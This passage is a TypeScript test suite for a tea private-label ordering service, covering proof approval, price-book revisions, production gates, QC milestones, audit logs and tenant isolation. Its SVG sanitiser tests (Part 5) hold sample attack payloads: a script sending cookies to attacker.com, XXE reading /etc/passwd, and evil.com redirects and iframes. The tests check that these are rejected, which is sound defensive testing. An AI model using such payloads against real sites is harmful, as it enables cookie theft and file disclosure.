          scene_json: { lockTest: true },
          front_artwork_asset_id: asset.id,
        },
        ACTOR_CUSTOMER_A,
        ACTOR_CUSTOMER_A.actor_id
      );

      // First approval succeeds and locks the proof
      const approval = PrivateLabelService.approveProof(prepareProofForApproval(ver.id),
        { disclaimer_accepted: true, signer_name: "Alice Signer" },
        ACTOR_CUSTOMER_A,
        ACTOR_CUSTOMER_A.actor_id
      );
      expect(approval.action).toBe("customer_approved");

      // Second approval attempt on the same version throws PrivateLabelRevisionConflictError
      expect(() => {
        PrivateLabelService.approveProof(prepareProofForApproval(ver.id),
          { disclaimer_accepted: true, signer_name: "Alice Signer Duplicate" },
          ACTOR_CUSTOMER_A,
          ACTOR_CUSTOMER_A.actor_id
        );
      }).toThrow(PrivateLabelRevisionConflictError);

      try {
        PrivateLabelService.approveProof(prepareProofForApproval(ver.id),
          { disclaimer_accepted: true, signer_name: "Alice Signer Duplicate" },
          ACTOR_CUSTOMER_A,
          ACTOR_CUSTOMER_A.actor_id
        );
      } catch (err) {
        const revErr = err as PrivateLabelRevisionConflictError;
        expect(revErr.status).toBe(409);
        expect(revErr.message).toContain("already approved and locked");
      }
    });

    it("2.8: proof rejection marks proof preflight_failed, unlocks, and increments project revision", () => {
      const project = PrivateLabelService.createProjectDraft(
        {
          title: "Proof Rejection Project",
          items: [
            {
              teaOptionId: "tea_first_flush_darjeeling",
              packagingVariantId: "pkg_pouch_standup_250g_kraft",
              printMethodId: "pm_paper_label",
              quantityUnits: 500,
              fillWeightGrams: 100,
            },
          ],
        },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      const fullProject = PrivateLabelService.getProject(project.id, ACTOR_CUSTOMER_A.actor_id);
      const projectItemId = fullProject.items[0]?.id;
      const asset = PrivateLabelService.createArtworkAsset(
        {
          original_filename: "label_reject_test.png",
          storage_key: "/uploads/label_reject_test.png",
          file_sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
          mime_type: "image/png",
          file_size_bytes: 50000,
          rights_attestation: true,
        },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      const ver = PrivateLabelService.createDesignVersion(
        project.id,
        {
          project_item_id: projectItemId,
          scene_json: { rejectTest: true },
          front_artwork_asset_id: asset.id,
        },
        ACTOR_CUSTOMER_A,
        ACTOR_CUSTOMER_A.actor_id
      );

      const db = getDb();
      const revBeforeReject = (db.prepare("SELECT revision FROM pl_projects WHERE id = ?").get(project.id) as { revision: number }).revision;

      const event = PrivateLabelService.rejectProof(
        ver.id,
        { reason: "Logo color is faded, requires darker ink" },
        ACTOR_CUSTOMER_A,
        ACTOR_CUSTOMER_A.actor_id
      );

      expect(event.action).toBe("customer_rejected");
      expect(event.notes).toBe("Logo color is faded, requires darker ink");

      // Verify DB state
      const updatedVer = db.prepare("SELECT * FROM pl_design_versions WHERE id = ?").get(ver.id) as {
        status: string;
        is_locked: number;
      };
      expect(updatedVer.status).toBe("preflight_failed");
      expect(updatedVer.is_locked).toBe(0);

      const updatedProj = db.prepare("SELECT revision FROM pl_projects WHERE id = ?").get(project.id) as {
        revision: number;
      };
      expect(updatedProj.revision).toBe(revBeforeReject + 1);
    });

    it("2.9: PriceBook updates enforce CAS expected_revision matching", () => {
      const pb = PrivateLabelService.upsertPriceBook(
        {
          name: "CAS Price Book Test",
          currency: "INR",
          margin_rate: 0.2,
        },
        ACTOR_ADMIN
      );

      expect(pb.revision).toBe(1);

      // Attempt update with stale expected_revision: 999
      expect(() => {
        PrivateLabelService.upsertPriceBook(
          {
            id: pb.id,
            name: "Updated Name Stale",
            margin_rate: 0.25,
          },
          ACTOR_ADMIN,
          999 // Stale revision
        );
      }).toThrow(PrivateLabelRevisionConflictError);

      // Attempt update with matching expected_revision: 1 succeeds
      const updatedPb = PrivateLabelService.upsertPriceBook(
        {
          id: pb.id,
          name: "Updated Name Matched",
          margin_rate: 0.25,
        },
        ACTOR_ADMIN,
        1
      );
      expect(updatedPb.revision).toBe(2);
      expect(updatedPb.name).toBe("Updated Name Matched");
    });
  });

  // ==========================================================================
  // Part 3: Production Release Hard Gates, Emergency Overrides & 7-Stage QC Lifecycle
  // ==========================================================================
  describe("Part 3: Production Release Hard Gates, Emergency Overrides & 7-Stage QC Lifecycle", () => {
    it("3.1: production release gate blocks releasing an order without approved proof", () => {
      const db = getDb();
      const { orderId } = createTestOrder(db, "deposit_paid");

      const gate = PrivateLabelService.validateReleaseGate(orderId);
      expect(gate.eligible).toBe(false);
      expect(gate.blockers).toContain(
        "Artwork proof approval is required prior to releasing order to production"
      );

      expect(() => {
        PrivateLabelService.releaseProductionJob(orderId, {}, ACTOR_ADMIN);
      }).toThrow(PrivateLabelGateError);
    });

    it("3.2: production release gate blocks releasing an order without deposit_paid status", () => {
      const db = getDb();
      const { orderId } = createTestOrder(db, "pending_deposit");

      const gate = PrivateLabelService.validateReleaseGate(orderId);
      expect(gate.eligible).toBe(false);
      expect(gate.blockers).toContain("Order status must be 'deposit_paid' (current status: 'pending_deposit')");

      expect(() => {
        PrivateLabelService.releaseProductionJob(orderId, {}, ACTOR_ADMIN);
      }).toThrow(PrivateLabelGateError);
    });

    it("3.3: blocked production release persists release_blocked forensic audit trail entry in pl_audit", () => {
      const db = getDb();
      const { orderId } = createTestOrder(db, "pending_deposit");

      try {
        PrivateLabelService.releaseProductionJob(orderId, {}, ACTOR_ADMIN);
      } catch {
        // Expected PrivateLabelGateError
      }

      // Invariant: pl_audit MUST contain the release_blocked record despite the exception
      const auditRows = db
        .prepare("SELECT * FROM pl_audit WHERE entity_type = 'production_job' AND entity_id = ? AND action = 'release_blocked'")
        .all(orderId) as Array<{ action: string; diff_json: string }>;

      expect(auditRows.length).toBeGreaterThanOrEqual(1);
      const parsedDiff = JSON.parse(auditRows[0].diff_json);
      expect(parsedDiff.blockers).toBeDefined();
      expect(parsedDiff.blockers.length).toBeGreaterThan(0);
    });

    it("3.4: emergency operator override successfully bypasses release blockers with mandatory justification", () => {
      const db = getDb();
      const { orderId } = createTestOrder(db, "pending_deposit");

      const justification = "Director approved offline wire transfer and in-person press sheet sign-off.";
      const job = PrivateLabelService.releaseProductionJob(
        orderId,
        {
          override_justification: justification,
          operator_notes: "Emergency release for exhibition batch",
        },
        ACTOR_ADMIN
      );

      expect(job.status).toBe("scheduled");
      expect(job.override_justification).toBe(justification);

      // Verify order status updated to production_released
      const order = db.prepare("SELECT status FROM pl_orders WHERE id = ?").get(orderId) as { status: string };
      expect(order.status).toBe("production_released");

      // Verify 7 standard QC milestones initialized
      const milestones = db
        .prepare("SELECT stage, status FROM pl_qc_milestones WHERE job_id = ? ORDER BY created_at ASC")
        .all(job.id) as Array<{ stage: string; status: string }>;
      expect(milestones).toHaveLength(7);
      expect(milestones.every((m) => m.status === "pending")).toBe(true);
    });

    it("3.5: QC fill weight tolerance (+/- 1.5%) accepts within limit and blocks > 1.5% variance", () => {
      const db = getDb();
      const { orderId } = createTestOrder(db, "production_released");
      const jobId = `job_${randomUUID()}`;
      db.prepare(`
        INSERT INTO pl_jobs (id, job_number, order_id, status, released_by, revision, created_at, updated_at)
        VALUES (?, 'PL-JOB-FILL', ?, 'scheduled', 'admin-adv-001', 1, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)
      `).run(jobId, orderId);

      // Within +/-1.5%: 100g target, 101.2g recorded (1.2% variance) -> passes
      const validMilestone = PrivateLabelService.recordQCMilestone(
        jobId,
        {
          stage: "fill_weight",
          status: "passed",
          target_weight_g: 100,
          recorded_weight_g: 101.2,
          notes: "Gravimetric check 10 packs random",
        },
        ACTOR_ADMIN
      );
      expect(validMilestone.status).toBe("passed");
      expect(validMilestone.recorded_weight_g).toBe(101.2);

      // Exceeding +/-1.5%: 100g target, 102.5g recorded (2.5% variance) -> throws PrivateLabelGateError
      expect(() => {
        PrivateLabelService.recordQCMilestone(
          jobId,
          {
            stage: "fill_weight",
            status: "passed",
            target_weight_g: 100,
            recorded_weight_g: 102.5,
          },
          ACTOR_ADMIN
        );
      }).toThrow(PrivateLabelGateError);
    });

    it("3.6: critical QC milestone failure (seal_integrity) automatically halts production job", () => {
      const db = getDb();
      const { orderId } = createTestOrder(db, "production_released");
      const jobId = `job_${randomUUID()}`;
      db.prepare(`
        INSERT INTO pl_jobs (id, job_number, order_id, status, released_by, revision, created_at, updated_at)
        VALUES (?, 'PL-JOB-SEAL-FAIL', ?, 'qc', 'admin-adv-001', 1, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)
      `).run(jobId, orderId);

      PrivateLabelService.recordQCMilestone(
        jobId,
        {
          stage: "seal_integrity",
          status: "failed",
          notes: "Vacuum chamber bubble test failed at 25 kPa",
        },
        ACTOR_ADMIN
      );

      const job = db.prepare("SELECT status FROM pl_jobs WHERE id = ?").get(jobId) as { status: string };
      expect(job.status).toBe("halted");
    });

    it("3.7: critical QC milestone failure (sensory_cupping) automatically halts production job", () => {
      const db = getDb();
      const { orderId } = createTestOrder(db, "production_released");
      const jobId = `job_${randomUUID()}`;
      db.prepare(`
        INSERT INTO pl_jobs (id, job_number, order_id, status, released_by, revision, created_at, updated_at)
        VALUES (?, 'PL-JOB-CUPPING-FAIL', ?, 'qc', 'admin-adv-001', 1, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)
      `).run(jobId, orderId);

      PrivateLabelService.recordQCMilestone(
        jobId,
        {
          stage: "sensory_cupping",
          status: "failed",
          cupping_score: 74.5,
          notes: "Off-notes detected: smoky taint in leaf retention sample",
        },
        ACTOR_ADMIN
      );

      const job = db.prepare("SELECT status FROM pl_jobs WHERE id = ?").get(jobId) as { status: string };
      expect(job.status).toBe("halted");
    });

    it("3.8: passing all 7 QC milestones automatically advances job status to ready_to_ship", () => {
      const db = getDb();
      const { orderId } = createTestOrder(db, "production_released");

      const job = PrivateLabelService.releaseProductionJob(
        orderId,
        { override_justification: "Pre-approved pipeline" },
        ACTOR_ADMIN
      );

      const stages: Array<"raw_material" | "packaging_incoming" | "print_proof" | "fill_weight" | "seal_integrity" | "sensory_cupping" | "final_pack"> = [
        "raw_material",
        "packaging_incoming",
        "print_proof",
        "fill_weight",
        "seal_integrity",
        "sensory_cupping",
        "final_pack",
      ];

      for (const stg of stages) {
        PrivateLabelService.recordQCMilestone(
          job.id,
          {
            stage: stg,
            status: "passed",
            notes: `Stage ${stg} verified compliant`,
          },
          ACTOR_ADMIN
        );
      }

      const updatedJob = PrivateLabelService.getProductionJob(job.id);
      expect(updatedJob.status).toBe("ready_to_ship");
      expect(updatedJob.milestones.every((m) => m.status === "passed")).toBe(true);
    });

    it("3.9: non-admin operator cannot modify QC milestones on ready_to_ship job (qc_locked gate)", () => {
      const db = getDb();
      const { orderId } = createTestOrder(db, "production_released");
      const jobId = `job_${randomUUID()}`;
      db.prepare(`
        INSERT INTO pl_jobs (id, job_number, order_id, status, released_by, revision, created_at, updated_at)
        VALUES (?, 'PL-JOB-LOCKED', ?, 'ready_to_ship', 'admin-adv-001', 1, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)
      `).run(jobId, orderId);

      // Non-admin customer attempt is blocked
      expect(() => {
        PrivateLabelService.recordQCMilestone(
          jobId,
          {
            stage: "final_pack",
            status: "passed",
          },
          ACTOR_CUSTOMER_A
        );
      }).toThrow(PrivateLabelGateError);

      try {
        PrivateLabelService.recordQCMilestone(
          jobId,
          { stage: "final_pack", status: "passed" },
          ACTOR_CUSTOMER_A
        );
      } catch (err) {
        const gateErr = err as PrivateLabelGateError;
        expect(gateErr.gate_name).toBe("qc_locked");
      }

      // Admin actor can modify even in ready_to_ship
      const adminMilestone = PrivateLabelService.recordQCMilestone(
        jobId,
        { stage: "final_pack", status: "passed", notes: "Supervisor adjustment" },
        ACTOR_ADMIN
      );
      expect(adminMilestone.status).toBe("passed");
    });
  });

  // ==========================================================================
  // Part 4: In-Transaction Audit Trail Persistence Invariants in pl_audit
  // ==========================================================================
  describe("Part 4: In-Transaction Audit Trail Persistence Invariants in pl_audit", () => {
    it("4.1: recordAudit creates fully populated, immutable row in pl_audit", () => {
      const db = getDb();
      const entityId = `entity_${randomUUID()}`;

      const rec = recordAudit(db, {
        entity_type: "custom_entity",
        entity_id: entityId,
        revision: 3,
        action: "security_seal_applied",
        actor: ACTOR_ADMIN,
        diff: { seal_serial: "TF-SEC-9988", verified: true },
      });

      expect(rec.id).toBeDefined();
      expect(rec.entity_type).toBe("custom_entity");
      expect(rec.entity_id).toBe(entityId);
      expect(rec.revision).toBe(3);
      expect(rec.action).toBe("security_seal_applied");
      expect(rec.actor_type).toBe("admin");
      expect(rec.actor_id).toBe(ACTOR_ADMIN.actor_id);
      expect(rec.actor_email).toBe(ACTOR_ADMIN.actor_email);
      expect(rec.ip_address).toBe(ACTOR_ADMIN.ip_address);
      expect(rec.reason).toBe(ACTOR_ADMIN.reason);

      const parsedDiff = JSON.parse(rec.diff_json);
      expect(parsedDiff.seal_serial).toBe("TF-SEC-9988");
      expect(parsedDiff.verified).toBe(true);
    });

    it("4.2: transactional rollback invariant: aborting transaction completely rolls back pl_audit row", () => {
      const db = getDb();
      const entityId = `rollback_${randomUUID()}`;

      expect(() => {
        db.transaction(() => {
          recordAudit(db, {
            entity_type: "aborted_entity",
            entity_id: entityId,
            revision: 1,
            action: "doomed_action",
            actor: ACTOR_CUSTOMER_A,
          });

          // Simulate database error / abort inside transaction
          throw new Error("Simulated intentional transaction abort");
        })();
      }).toThrow("Simulated intentional transaction abort");

      // Verify zero audit rows survived
      const audit = getAuditHistory(db, "aborted_entity", entityId);
      expect(audit).toHaveLength(0);
    });

    it("4.3: getAuditHistory returns records in strictly descending revision order", () => {
      const db = getDb();
      const entityId = `multirev_${randomUUID()}`;

      db.transaction(() => {
        recordAudit(db, {
          entity_type: "revision_test",
          entity_id: entityId,
          revision: 1,
          action: "create",
          actor: ACTOR_CUSTOMER_A,
        });
        recordAudit(db, {
          entity_type: "revision_test",
          entity_id: entityId,
          revision: 2,
          action: "update_step_1",
          actor: ACTOR_CUSTOMER_A,
        });
        recordAudit(db, {
          entity_type: "revision_test",
          entity_id: entityId,
          revision: 3,
          action: "finalize",
          actor: ACTOR_CUSTOMER_A,
        });
      })();

      const history = getAuditHistory(db, "revision_test", entityId);
      expect(history).toHaveLength(3);
      expect(history[0].revision).toBe(3);
      expect(history[1].revision).toBe(2);
      expect(history[2].revision).toBe(1);
    });

    it("4.4: actor attribution invariant preserves system and admin actor identities without truncation", () => {
      const db = getDb();
      const entityId = `actor_test_${randomUUID()}`;

      recordAudit(db, {
        entity_type: "system_task",
        entity_id: entityId,
        revision: 1,
        action: "cron_sweep",
        actor: ACTOR_SYSTEM,
      });

      const records = getAuditHistory(db, "system_task", entityId);
      expect(records).toHaveLength(1);
      expect(records[0].actor_type).toBe("system");
      expect(records[0].actor_id).toBe("cron-engine");
      expect(records[0].reason).toBe("System Automated Job Runner");
    });
  });

  // ==========================================================================
  // Part 5: Preflight Security Hardening & Malicious Payload Neutralization
  // ==========================================================================
  describe("Part 5: Preflight Security Hardening & Malicious Payload Neutralization", () => {
    it("5.1: sanitizeSvg neutralizes embedded <script> tags", () => {
      const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
        <circle cx="50" cy="50" r="40" fill="red" />
        <script type="text/javascript">
          fetch("https://attacker.com/steal?c=" + document.cookie);
        </script>
      </svg>`;

      const check = sanitizeSvg(maliciousSvg);
      expect(check.safe).toBe(false);
      expect(check.violations.some((v) => v.includes("<script>"))).toBe(true);
    });

    it("5.2: sanitizeSvg neutralizes inline JavaScript event handlers (onload, onclick, onmouseover)", () => {
      const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
        <rect width="100" height="100" onmouseover="window.location='http://evil.com'" />
      </svg>`;

      const check = sanitizeSvg(maliciousSvg);
      expect(check.safe).toBe(false);
      expect(check.violations.some((v) => v.includes("event handler"))).toBe(true);
    });

    it("5.3: sanitizeSvg neutralizes XML External Entity (XXE) injection attacks", () => {
      const xxeSvg = `<?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE svg [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
      ]>
      <svg xmlns="http://www.w3.org/2000/svg">
        <text>&xxe;</text>
      </svg>`;

      const check = sanitizeSvg(xxeSvg);
      expect(check.safe).toBe(false);
      expect(check.violations.some((v) => v.includes("XXE"))).toBe(true);
    });

    it("5.4: sanitizeSvg neutralizes <foreignObject> embedding vectors", () => {
      const foreignObjectSvg = `<svg xmlns="http://www.w3.org/2000/svg">
        <foreignObject width="100" height="100">
          <iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.com"></iframe>
        </foreignObject>
      </svg>`;

      const check = sanitizeSvg(foreignObjectSvg);
      expect(check.safe).toBe(false);
      expect(check.violations.some((v) => v.includes("<foreignObject>"))).toBe(true);
    });

    it("5.5: sanitizeSvg neutralizes javascript: URI in SVG hyperlinks", () => {
      const jsUriSvg = `<svg xmlns="http://www.w3.org/2000/svg">
        <a href="javascript:alert(document.domain)">
          <text x="10" y="20">Click me</text>
        </a>
      </svg>`;

      const check = sanitizeSvg(jsUriSvg);
      expect(check.safe).toBe(false);
      expect(check.violations.some((v) => v.includes("javascript: URI"))).toBe(true);
    });

    it("5.6: validatePreflight detects magic byte format mismatch (e.g. fake PNG with JPEG header)", async () => {
      // JPEG header in buffer declared as image/png
      const fakePngBuffer = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);

      const result = await validatePreflight({
        buffer: fakePngBuffer,
        mimeType: "image/png",
        filename: "malicious.png",
      });

      expect(result.valid).toBe(false);
      expect(result.status).toBe("rejected");
      expect(result.errors.some((e) => e.includes("magic bytes"))).toBe(true);
    });

    it("5.7: validatePreflight rejects file size exceeding 25MB maximum threshold", async () => {
      const result = await validatePreflight({
        fileSizeBytes: MAX_PREFLIGHT_FILE_SIZE_BYTES + 1,
        mimeType: "image/png",
        filename: "oversized.png",
      });

      expect(result.valid).toBe(false);
      expect(result.status).toBe("rejected");
      expect(result.errors.some((e) => e.includes("exceeds 25MB"))).toBe(true);
    });

    it("5.8: validatePreflight rejects 0-byte empty file payload", async () => {
      const result = await validatePreflight({
        fileSizeBytes: 0,
        mimeType: "image/png",
        filename: "empty.png",
      });

      expect(result.valid).toBe(false);
      expect(result.status).toBe("rejected");
      expect(result.errors.some((e) => e.includes("greater than 0 bytes"))).toBe(true);
    });

    it("5.9: validatePreflight distinguishes low-resolution warning (150-299 DPI) from fatal rejection (< 150 DPI)", async () => {
      // Target pouch: 160mm width = ~6.3 inches
      // 72 DPI -> width ~454px -> fatal rejection (< 150 DPI)
      const lowDpiResult = await validatePreflight({
        widthPx: 450,
        heightPx: 600,
        targetWidthMm: 160,
        targetHeightMm: 230,
        mimeType: "image/png",
        fileSizeBytes: 50000,
      });

      expect(lowDpiResult.valid).toBe(false);
      expect(lowDpiResult.status).toBe("rejected");
      expect(lowDpiResult.errors.some((e) => e.includes("below the 150 DPI minimum"))).toBe(true);

      // 200 DPI -> width ~1260px -> warning status (150-299 DPI)
      const warningDpiResult = await validatePreflight({
        widthPx: 1260,
        heightPx: 1800,
        targetWidthMm: 160,
        targetHeightMm: 230,
        mimeType: "image/png",
        fileSizeBytes: 500000,
      });

      expect(warningDpiResult.valid).toBe(true);
      expect(warningDpiResult.status).toBe("warning");
      expect(warningDpiResult.warnings.some((w) => w.includes("below recommended 300 DPI"))).toBe(true);
    });
  });

  // ==========================================================================
  // Part 6: Tenant Isolation & Anti-Enumeration (404) Under Adversarial Probing
  // ==========================================================================
  describe("Part 6: Tenant Isolation & Anti-Enumeration (404) Under Adversarial Probing", () => {
    it("6.1: cross-tenant project get returns 404 PrivateLabelNotFoundError with zero metadata leakage", () => {
      // Alice creates Project A
      const projectA = PrivateLabelService.createProjectDraft(
        { title: "Alice Confidential Tea Blend" },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      // Bob attempts to inspect Alice's project
      expect(() => {
        PrivateLabelService.getProject(projectA.id, ACTOR_CUSTOMER_B.actor_id);
      }).toThrow(PrivateLabelNotFoundError);

      try {
        PrivateLabelService.getProject(projectA.id, ACTOR_CUSTOMER_B.actor_id);
      } catch (err) {
        const notFound = err as PrivateLabelNotFoundError;
        expect(notFound.status).toBe(404);
        expect(notFound.entity_type).toBe("Project");
      }
    });

    it("6.2: cross-tenant project update returns 404 PrivateLabelNotFoundError", () => {
      const projectA = PrivateLabelService.createProjectDraft(
        { title: "Alice Secret Recipe" },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      expect(() => {
        PrivateLabelService.updateProjectDraft(
          projectA.id,
          1,
          { title: "Bob Malicious Tamper" },
          ACTOR_CUSTOMER_B,
          ACTOR_CUSTOMER_B.actor_id
        );
      }).toThrow(PrivateLabelNotFoundError);

      // Project A title remains untouched
      const freshProjectA = PrivateLabelService.getProject(projectA.id, ACTOR_CUSTOMER_A.actor_id);
      expect(freshProjectA.title).toBe("Alice Secret Recipe");
    });

    it("6.3: cross-tenant quote inspection returns 404 PrivateLabelNotFoundError", () => {
      const projectA = PrivateLabelService.createProjectDraft(
        {
          title: "Alice Quoted Project",
          draft_configuration: {
            teaOptionId: "tea_first_flush_darjeeling",
            packagingVariantId: "pkg_pouch_standup_250g_kraft",
            printMethodId: "pm_paper_label",
            quantityUnits: 500,
          },
        },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      const quoteA = PrivateLabelService.createQuote(
        projectA.id,
        { validity_days: 14 },
        ACTOR_CUSTOMER_A,
        ACTOR_CUSTOMER_A.actor_id
      );

      expect(() => {
        PrivateLabelService.getQuote(quoteA.id, ACTOR_CUSTOMER_B.actor_id);
      }).toThrow(PrivateLabelNotFoundError);
    });

    it("6.4: cross-tenant proof approval returns 404 PrivateLabelNotFoundError", () => {
      const projectA = PrivateLabelService.createProjectDraft(
        {
          title: "Alice Proof Project",
          items: [
            {
              teaOptionId: "tea_first_flush_darjeeling",
              packagingVariantId: "pkg_pouch_standup_250g_kraft",
              printMethodId: "pm_paper_label",
              quantityUnits: 500,
              fillWeightGrams: 100,
            },
          ],
        },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      const fullProject = PrivateLabelService.getProject(projectA.id, ACTOR_CUSTOMER_A.actor_id);
      const projectItemId = fullProject.items[0]?.id;
      const asset = PrivateLabelService.createArtworkAsset(
        {
          original_filename: "alice_proof.png",
          storage_key: "/uploads/alice_proof.png",
          file_sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
          mime_type: "image/png",
          file_size_bytes: 50000,
          rights_attestation: true,
        },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      const ver = PrivateLabelService.createDesignVersion(
        projectA.id,
        {
          project_item_id: projectItemId,
          scene_json: { crossTenant: true },
          front_artwork_asset_id: asset.id,
        },
        ACTOR_CUSTOMER_A,
        ACTOR_CUSTOMER_A.actor_id
      );

      // Bob tries to approve Alice's design version
      expect(() => {
        PrivateLabelService.approveProof(prepareProofForApproval(ver.id),
          { disclaimer_accepted: true, signer_name: "Bob Impersonator" },
          ACTOR_CUSTOMER_B,
          ACTOR_CUSTOMER_B.actor_id
        );
      }).toThrow(PrivateLabelNotFoundError);
    });

    it("6.5: customer cannot access project with null owner_customer_id (returns 404)", () => {
      const db = getDb();
      const unownedProjectId = `proj_unowned_${randomUUID()}`;

      db.prepare(`
        INSERT INTO pl_projects (id, title, status, owner_customer_id, revision, created_at, updated_at)
        VALUES (?, 'Unowned Orphan Project', 'draft', NULL, 1, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)
      `).run(unownedProjectId);

      expect(() => {
        PrivateLabelService.getProject(unownedProjectId, ACTOR_CUSTOMER_A.actor_id);
      }).toThrow(PrivateLabelNotFoundError);
    });

    it("6.6: admin actor transcends tenant boundaries with complete audit attribution", () => {
      const projectA = PrivateLabelService.createProjectDraft(
        { title: "Alice Admin-Accessible Project" },
        ACTOR_CUSTOMER_A.actor_id,
        ACTOR_CUSTOMER_A
      );

      // Admin accesses Alice's project (no customerId filter, or admin actor)
      const inspectedByAdmin = PrivateLabelService.getProject(projectA.id);
      expect(inspectedByAdmin.id).toBe(projectA.id);

      // Admin updates Alice's project with audit trace
      const updatedByAdmin = PrivateLabelService.updateProjectDraft(
        projectA.id,
        1,
        { notes: "Admin review note attached." },
        ACTOR_ADMIN
      );

      expect(updatedByAdmin.revision).toBe(2);

      const db = getDb();
      const history = getAuditHistory(db, "project", projectA.id);
      expect(history[0].actor_type).toBe("admin");
      expect(history[0].actor_id).toBe(ACTOR_ADMIN.actor_id);
    });
  });
});
